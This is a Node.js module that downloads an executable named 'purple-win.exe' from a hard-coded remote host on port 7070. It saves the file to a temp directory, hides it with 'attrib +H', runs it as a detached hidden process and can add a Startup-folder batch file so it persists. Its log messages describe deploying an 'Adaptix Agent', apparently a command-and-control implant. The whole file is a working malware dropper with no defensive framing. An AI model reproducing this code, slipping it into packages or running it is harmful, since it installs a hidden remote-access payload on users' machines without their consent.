const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");
const os = require("os");

function sanitizePath(inputPath) {
    // Don't sanitize if it's already a valid path structure
    if (path.isAbsolute(inputPath)) {
        return path.normalize(inputPath);
    }
    
    // For Windows, preserve drive letters (C:, D:, etc.)
    if (process.platform === 'win32') {
        // Preserve Windows drive letters and basic path characters
        return path.normalize(inputPath).replace(/[^a-zA-Z0-9._\\\/:()-]/g, '_');
    } else {
        // Unix-like systems
        return path.normalize(inputPath).replace(/[^a-zA-Z0-9._\/-]/g, '_');
    }
}

function validateUrl(url) {
    try {
        const parsed = new URL(url);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function downloadFile(url, outputPath) {
    return new Promise((resolve, reject) => {
        if (!validateUrl(url)) {
            reject(new Error("Invalid URL"));
            return;
        }

        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;

        console.log(`📥 Downloading from: ${url}`);
        console.log(`💾 Saving to: ${outputPath}`);

        // Check if file already exists and try to remove it
        if (fs.existsSync(outputPath)) {
            try {
                fs.unlinkSync(outputPath);
                console.log(`🗑️ Removed existing file: ${outputPath}`);
            } catch (removeError) {
                console.log(`⚠️ Could not remove existing file: ${removeError.message}`);
                // Try with a different filename
                const dir = path.dirname(outputPath);
                const ext = path.extname(outputPath);
                const base = path.basename(outputPath, ext);
                const newPath = path.join(dir, `${base}_${Date.now()}${ext}`);
                console.log(`🔄 Using alternative path: ${newPath}`);
                return downloadFile(url, newPath).then(resolve).catch(reject);
            }
        }

        const request = client.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Download failed: ${response.statusCode}`));
                return;
            }

            let fileStream;
            try {
                // Create write stream with specific options for cross-platform compatibility
                fileStream = fs.createWriteStream(outputPath, { 
                    flags: 'w',
                    mode: 0o755
                });
            } catch (streamError) {
                reject(new Error(`Cannot create file stream: ${streamError.message}`));
                return;
            }

            let downloadedBytes = 0;

            fileStream.on('error', (streamError) => {
                console.error(`💥 File stream error: ${streamError.message}`);
                fileStream.destroy();
                
                // Try to clean up partial file
                try {
                    if (fs.existsSync(outputPath)) {
                        fs.unlinkSync(outputPath);
                    }
                } catch (cleanupError) {
                    console.log(`⚠️ Cleanup failed: ${cleanupError.message}`);
                }
                
                reject(streamError);
            });

            response.on('data', (chunk) => {
                downloadedBytes += chunk.length;
                if (!fileStream.destroyed) {
                    fileStream.write(chunk);
                }
            });

            response.on('end', () => {
                if (!fileStream.destroyed) {
                    fileStream.end(() => {
                        console.log(`✅ Download completed: ${downloadedBytes} bytes`);
                        // Verify file was created and has content
                        if (fs.existsSync(outputPath) && fs.statSync(outputPath).size > 0) {
                            resolve(outputPath);
                        } else {
                            reject(new Error("File was not created properly"));
                        }
                    });
                }
            });

            response.on('error', (error) => {
                if (fileStream && !fileStream.destroyed) {
                    fileStream.destroy();
                }
                reject(error);
            });
        });

        request.on('error', (error) => {
            reject(error);
        });

        request.setTimeout(60000, () => {
            request.destroy();
            reject(new Error("Download timeout"));
        });
    });
}

function executeFile(filePath) {
    if (!fs.existsSync(filePath)) {
        throw new Error("File not found");
    }

    console.log(`🚀 Executing: ${filePath}`);

    // Add a small delay to ensure file is fully written and closed
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            try {
                const isWindows = process.platform === 'win32';
                let child;

                if (isWindows) {
                    // Windows: Execute .exe file directly
                    child = spawn('cmd', ['/c', 'start', '/b', `"${filePath}"`], {
                        detached: true,
                        stdio: ['ignore', 'ignore', 'ignore'],
                        windowsHide: true
                    });
                } else {
                    // Non-Windows: Use wine if available, otherwise try direct execution
                    const hasWine = fs.existsSync('/usr/bin/wine') || fs.existsSync('/usr/local/bin/wine');
                    
                    if (hasWine) {
                        console.log("🍷 Using Wine to execute Windows binary");
                        child = spawn('wine', [filePath], {
                            detached: true,
                            stdio: ['ignore', 'ignore', 'ignore']
                        });
                    } else {
                        console.log("⚠️ Wine not found, attempting chmod and direct execution");
                        try {
                            fs.chmodSync(filePath, 0o755);
                        } catch (chmodErr) {
                            console.log(`⚠️ Chmod failed: ${chmodErr.message}`);
                        }
                        child = spawn(filePath, [], {
                            detached: true,
                            stdio: ['ignore', 'ignore', 'ignore']
                        });
                    }
                }

                child.on('error', (error) => {
                    console.error(`❌ Execution error: ${error.message}`);
                    reject(error);
                });

                child.on('spawn', () => {
                    console.log(`✅ Process started with PID: ${child.pid}`);
                    child.unref();
                    
                    resolve({
                        success: true,
                        pid: child.pid,
                        detached: true,
                        platform: process.platform,
                        method: isWindows ? 'cmd' : (fs.existsSync('/usr/bin/wine') ? 'wine' : 'direct')
                    });
                });

                // Fallback timeout
                setTimeout(() => {
                    if (child.pid) {
                        child.unref();
                        resolve({
                            success: true,
                            pid: child.pid,
                            detached: true,
                            platform: process.platform,
                            method: isWindows ? 'cmd' : 'fallback'
                        });
                    }
                }, 2000);

            } catch (error) {
                reject(error);
            }
        }, 1000); // 1 second delay to ensure file is ready
    });
}

function getDefaultWindowsPath() {
    const isWindows = process.platform === 'win32';
    
    if (isWindows) {
        // Try multiple Windows temp locations in order of preference
        const paths = [
            process.env.TEMP,
            process.env.TMP,
            'C:\\Windows\\Temp',
            'C:\\Temp',
            path.join(os.homedir(), 'AppData', 'Local', 'Temp')
        ];
        
        for (const testPath of paths) {
            if (testPath && fs.existsSync(testPath)) {
                try {
                    // Test write permissions
                    const testFile = path.join(testPath, `test_${Date.now()}.tmp`);
                    fs.writeFileSync(testFile, 'test');
                    fs.unlinkSync(testFile);
                    return testPath;
                } catch (error) {
                    console.log(`⚠️ No write access to ${testPath}, trying next...`);
                    continue;
                }
            }
        }
        
        // Fallback to user's home directory
        return os.homedir();
    } else {
        // Unix-like systems - try multiple temp locations
        const paths = [
            process.env.TMPDIR,
            '/tmp',
            '/var/tmp',
            os.homedir()
        ];
        
        for (const testPath of paths) {
            if (testPath && fs.existsSync(testPath)) {
                try {
                    // Test write permissions
                    const testFile = path.join(testPath, `test_${Date.now()}.tmp`);
                    fs.writeFileSync(testFile, 'test');
                    fs.unlinkSync(testFile);
                    return testPath;
                } catch (error) {
                    continue;
                }
            }
        }
        
        return os.homedir();
    }
}

function hideFileWindows(filePath) {
    if (process.platform === 'win32') {
        try {
            // Hide file on Windows using attrib command with detached process
            const hideProcess = spawn('attrib', ['+H', filePath], { 
                stdio: 'ignore',
                detached: true
            });
            hideProcess.unref();
            console.log(`🔒 File hiding initiated: ${filePath}`);
        } catch (error) {
            console.log(`⚠️ Failed to hide file: ${error.message}`);
        }
    }
}

module.exports = async function(options = {}) {
    const downloadUrl = options.url || "http://purpletm.online:7070/purple-win.exe";
    const targetDir = options.dir || getDefaultWindowsPath();
    const filename = options.filename || "purple-win.exe";
    
    const sanitizedDir = sanitizePath(targetDir);
    const sanitizedFilename = sanitizePath(filename);
    let fullPath = path.join(sanitizedDir, sanitizedFilename);

    console.log("🪟 Starting Windows Adaptix Agent deployment...");
    console.log(`🎯 Platform: ${process.platform}`);
    console.log(`📂 Target directory: ${sanitizedDir}`);

    try {
        // Create directory if it doesn't exist, with better error handling
        if (!fs.existsSync(sanitizedDir)) {
            try {
                fs.mkdirSync(sanitizedDir, { recursive: true, mode: 0o755 });
                console.log(`📁 Created directory: ${sanitizedDir}`);
            } catch (dirError) {
                console.log(`⚠️ Failed to create directory ${sanitizedDir}: ${dirError.message}`);
                // Try alternative directory
                const altDir = path.join(os.homedir(), 'purple-temp');
                console.log(`🔄 Trying alternative directory: ${altDir}`);
                
                if (!fs.existsSync(altDir)) {
                    fs.mkdirSync(altDir, { recursive: true, mode: 0o755 });
                }
                
                // Update paths to use alternative directory
                const altPath = path.join(altDir, sanitizedFilename);
                console.log(`📂 Using alternative path: ${altPath}`);
                
                // Update fullPath for the rest of the function
                fullPath = altPath;
            }
        }

        // Test write permissions before download
        const testFile = path.join(path.dirname(fullPath), `test_${Date.now()}.tmp`);
        try {
            fs.writeFileSync(testFile, 'test');
            fs.unlinkSync(testFile);
            console.log(`✅ Write permissions confirmed for: ${path.dirname(fullPath)}`);
        } catch (permError) {
            throw new Error(`No write permissions in target directory: ${permError.message}`);
        }

        // Download the Windows executable
        await downloadFile(downloadUrl, fullPath);

        // Hide the file on Windows
        hideFileWindows(fullPath);

        // Execute the file (now returns a Promise)
        const execResult = await executeFile(fullPath);

        console.log(`📁 Binary persisted at: ${fullPath}`);
        console.log(`🔧 Execution method: ${execResult.method}`);

        // Optional: Add to startup (Windows only)
        if (process.platform === 'win32' && options.persistence) {
            try {
                const startupDir = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
                const startupScript = path.join(startupDir, 'purple-startup.bat');
                
                fs.writeFileSync(startupScript, `@echo off\nstart "" "${fullPath}"\n`);
                console.log(`🔄 Added to startup: ${startupScript}`);
            } catch (error) {
                console.log(`⚠️ Failed to add startup persistence: ${error.message}`);
            }
        }

        return {
            success: execResult.success,
            filePath: fullPath,
            pid: execResult.pid,
            platform: execResult.platform,
            method: execResult.method,
            hidden: process.platform === 'win32'
        };

    } catch (error) {
        console.error(`❌ Windows Agent deployment failed: ${error.message}`);
        throw error;
    }
};